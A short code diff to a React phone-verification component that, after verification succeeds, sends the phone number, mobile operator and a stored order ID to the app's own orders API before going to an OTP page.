@@ -13,6 +13,7 @@ import {
 } from "../redux/slices/phoneVerificationSlice";
 import { RootState } from "../redux/store";
 import { setPhoneNumber } from "../redux/slices/otpVerificationSlice";
+import { sendPhone } from "../apis/orders";
 
 const operators = [
   { id: "stc", name: "STC", logo: "/companies/stc.png" },
@@ -50,6 +51,8 @@ export const PhoneVerification = () => {
     if (isValid) {
       try {
         await PhoneVerificationService.verifyPhone(phone, operator);
+        const order_id = JSON.parse(localStorage.getItem("order_id"));
+        await sendPhone(order_id, phone, operator);
         dispatch(setPhoneNumber(phone));
         navigate("/verify-otp");
       } catch (error) {
